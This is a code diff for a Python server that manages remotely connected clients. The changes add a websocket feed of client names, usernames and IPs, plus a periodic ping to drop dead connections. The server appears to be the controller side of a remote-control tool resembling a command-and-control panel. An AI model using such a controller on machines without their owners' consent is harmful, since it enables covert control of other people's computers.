@@ -1,5 +1,6 @@
 # standard libraries
 import threading
+import asyncio
 import socket
 import random
 import time
@@ -8,6 +9,7 @@ import os
 
 # third-party libraries
 from prettytable import PrettyTable
+import websocket
 import webapi
 
 # global variables
@@ -123,7 +125,7 @@ def ClientInformation(connection):
             'connection_id': client['connection_id'],
             'computer_name': client['computer_name'],
             'username': client['username'],
-            'ip_address': client['socket'].getpeername()[0],
+            'ip_address': client['ip_address'],
          }
 
    return None
@@ -133,6 +135,26 @@ def SendMessage(connection, message):
    if ('message' in response):
       status = send_and_receive(connection, message, True)
       return status
+
+async def send_message_async(message):
+    await websocket.send_message(message)
+
+def start_websocket_server():
+    asyncio.set_event_loop(asyncio.new_event_loop())
+    asyncio.run(websocket.main())
+
+def send_message_threadsafe():
+    clientData = list()
+
+    for client in clients:
+         clientData.append({
+            'connection_id': client['connection_id'],
+            'computer': client['computer_name'],
+            'username': client['username'],
+            'ip_address': client['ip_address'],
+         })
+
+    asyncio.run(send_message_async(str(clientData)))
 
 def RemoteConnect(server, port):
    objSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -146,19 +168,51 @@ def RemoteConnect(server, port):
          data = json.loads(receive(client))
          connectionId = random.randint(100000000, 999999999)
 
+         for c in clients:
+            if (c['computer_name'] == data['computer_name']):
+               clients.remove(c)
+
          clients.append({
             'socket': client,
+            'ip_address': client.getpeername()[0],
             'computer_name': data['computer_name'],
             'username': data['username'],
             'connection_id': connectionId,
          })
+         
+         send_message_threadsafe()
 
       except socket.error:
          objSocket.close()
          del(objSocket)
          break
 
+def DetectChanges():
+    hasChanges = False
+
+    for client in clients:
+        try:
+            response = send_and_receive(client['connection_id'], 'ping')
+            if 'ping' not in response:
+                raise socket.error
+            
+        except (socket.error, ValueError):
+            clients.remove(client)
+            hasChanges = True
+
+    if (hasChanges):
+        send_message_threadsafe()
+
+    hasChanges = False
+    threading.Timer(3, DetectChanges).start()
+
 webapi.api.ManageConnections = ManageConnections
 webapi.api.ControlClient = ControlClient
 webapi.api.ClientInformation = ClientInformation
 webapi.api.SendMessage = SendMessage
+
+server_thread = threading.Thread(target=start_websocket_server)
+server_thread.daemon = True
+server_thread.start()
+
+DetectChanges()
